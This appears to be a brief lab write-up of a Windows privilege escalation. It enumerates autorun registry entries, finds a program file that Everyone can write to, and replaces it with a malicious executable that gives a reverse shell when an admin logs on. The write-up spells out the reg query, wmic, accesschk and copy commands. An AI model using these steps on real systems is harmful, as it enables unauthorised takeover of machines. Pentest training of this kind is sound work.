# Vulnerability Overview


# POC
This exploitation was done as a white box test, where we had credentials to a valid user account, and from there , try to see how  we can exploit the windows machine.

### Initial Access
The machine 
![Screenshot from 2025-03-19 08-32-37](https://github.com/user-attachments/assets/874bcd58-703c-443d-915c-5c0a721b41ae)


### Exploitation


Then using the following command, i was able to get the (Autoruns)
    
    reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
![image](https://github.com/user-attachments/assets/779f48f7-971d-4c6a-8532-1b265bea0115)

or
                                    
    wmic startup get caption, command
![image](https://github.com/user-attachments/assets/30030100-2834-4461-acb2-98a0282ca71c)

Next, tried getting the access on this autoruns using the following command 

    C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
and this gave the result that `Everyone` can write into the file
![image](https://github.com/user-attachments/assets/7244ad55-a8a3-43d1-93f6-fe3c2f315049)


Since there's a write access for everyone, I then continued to replace the originnal program.exe with a malicious file called esc.exe 

        copy C:\Users\user\esc.exe "C:\Program Files\Autorun Program\program.exe" /

![image](https://github.com/user-attachments/assets/fff7106d-aad4-4e60-a244-588fc87cd278)



The next thing is to wait for an admin to try to log in to the machine to trigger the malicious file, and get a reverse shell

![image](https://github.com/user-attachments/assets/320ae655-96d5-403c-b4ed-49a2161825fd)




![image](https://github.com/user-attachments/assets/59a4dc95-0765-4517-a87c-03cb5a35e4ca)

    
    
